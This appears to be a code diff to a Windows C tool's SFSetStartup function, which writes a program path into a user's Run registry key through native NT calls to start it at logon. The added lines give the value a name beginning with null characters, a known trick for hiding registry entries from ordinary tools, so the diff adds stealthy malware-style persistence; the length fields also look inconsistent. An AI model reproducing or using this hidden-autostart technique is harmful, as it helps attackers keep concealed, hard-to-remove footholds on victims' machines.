@@ -19,8 +19,12 @@ void SFSetStartup(char* exePath) {
     swprintf(keyPathBuffer, 512, L"\\Registry\\User\\%s\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", sidString);
     UNICODE_STRING keyPath;
     RtlInitUnicodeString(&keyPath, keyPathBuffer);
+    wchar_t HiddenkeyPathBuffer[512];
+    swprintf(HiddenkeyPathBuffer, 512, L"\0\0\\Registry\\User\\%s\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", sidString);
     UNICODE_STRING valueName;
-    RtlInitUnicodeString(&valueName, L"\0\0SFStartup");
+    valueName.Buffer = HiddenkeyPathBuffer;
+    valueName.Length = 2 * 11;
+    valueName.MaximumLength = 0;
     wchar_t* programPath = NULL;
     size_t programPathSize = strlen(exePath) + 1;
     programPath = (wchar_t*)malloc(programPathSize * sizeof(wchar_t));
@@ -34,9 +38,10 @@ void SFSetStartup(char* exePath) {
     if (keyHandle == 0) {
         SFPrintError("Failed to Open Key.", "打开键值失败");
         return;
-    } else {
-    o_mode = 5;
-    SFPrintSuccess("Successfully Set Auto Startup.", "成功设置开机自启动");
-    status = SFNtSetValueKey(keyHandle, &valueName, 0, REG_SZ, (PVOID)programPath, programPathSize * sizeof(wchar_t));
+    }
+    else {
+        o_mode = 5;
+        SFPrintSuccess("Successfully Set Auto Startup.", "成功设置开机自启动");
+        status = SFNtSetValueKey(keyHandle, &valueName, 0, REG_SZ, (PVOID)programPath, programPathSize * sizeof(wchar_t));
     }
 }
